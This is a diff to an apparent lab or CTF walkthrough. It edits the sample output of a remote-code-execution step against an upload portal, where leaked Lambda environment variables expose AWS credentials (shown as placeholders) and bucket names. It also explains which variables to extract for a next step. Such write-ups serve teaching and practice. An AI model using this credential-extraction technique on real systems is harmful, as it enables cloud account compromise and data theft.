@@ -252,14 +252,20 @@ $ curl -s -X POST http://<portal-ip>/upload \
 The response is HTML. The credentials appear inside `<div class='rce-box'>`:
 
 ```html
-<div class='rce-box'>AWS_ACCESS_KEY_ID=<access-key-id>
+<div class='rce-box'>AWS_LAMBDA_FUNCTION_NAME=beaversound-process-upload-<suffix>
+AWS_LAMBDA_FUNCTION_MEMORY_SIZE=256
+AWS_REGION=us-east-1
+AWS_DEFAULT_REGION=us-east-1
+AWS_ACCESS_KEY_ID=<access-key-id>
 AWS_SECRET_ACCESS_KEY=<secret-access-key>
 AWS_SESSION_TOKEN=<session-token>
-AWS_REGION=us-east-1
+AWS_EXECUTION_ENV=AWS_Lambda_python3.9
 VAULT_BUCKET=beaversound-vault-<suffix>
 UPLOADS_BUCKET=beaversound-uploads-<suffix>
 </div>
 ```
+
+The grep pattern matches ~15 `AWS_*` variables in total — the Lambda runtime injects additional `AWS_LAMBDA_*` vars (log group, log stream, runtime API, X-Ray config). The values needed for the next step are the credential trio and the two bucket names.
 
 Extract only the credential lines cleanly:
 
